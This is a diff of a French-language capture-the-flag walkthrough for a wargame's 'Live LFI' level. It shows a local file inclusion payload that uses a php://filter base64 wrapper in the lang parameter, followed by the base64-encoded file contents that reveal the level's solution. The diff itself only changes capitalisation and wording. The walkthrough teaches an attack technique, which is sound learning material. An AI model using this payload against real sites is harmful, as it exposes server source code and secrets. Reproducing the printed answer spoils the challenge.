@@ -53,11 +53,11 @@
 
 ## [ level 15 ]
 - Cliquer sur le lien du challenge  **Live LFI** puis elle vous redirigera vers un site .
-- cliquez sur l'un des drapeaux **anglais** ou le drapeau **allemand** et l' URL changera comme ceci :
+- Cliquez sur l'un des drapeaux **anglais** ou le drapeau **allemand** et l' URL changera comme ceci :
   <pre>https://lfi.warchall.net/index.php?lang=en</pre>
-- puis on change comme ci-dessous l'URL :
+- Puis on change comme ci-dessous l'URL :
   <pre>https://lfi.warchall.net/index.php?lang=php://filter/convert.base64-encode/resource=solution.php</pre>
-- puis on actualise et le contenu change et affiche ceci :
+- Puis on actualise et le contenu change et cela s'affiche :
   ```plaintext
 
   PGh0bWw+Cjxib2R5Pgo8cHJlIHN0eWxlPSJjb2xvcjojMDAwOyI+dGVoIGZhbGcgc2kgbmFlciE8L3ByZT4KPHByZSBzdHlsZT0iY29sb3I6I2ZmZjsiPnRoZSBmbGFnIGlzIG5lYXIhPC9wcmU+CjwvYm9keT4KPC9odG1sPgo8P3BocCAgICAgICAgICAgICAgICAgICMgICBZT1VSX1RST1BIWSAKcmV0dXJuICdTdGVwcGluU3RvbmVzNDJQaWUnOyAjIDwtwrQgPz4K
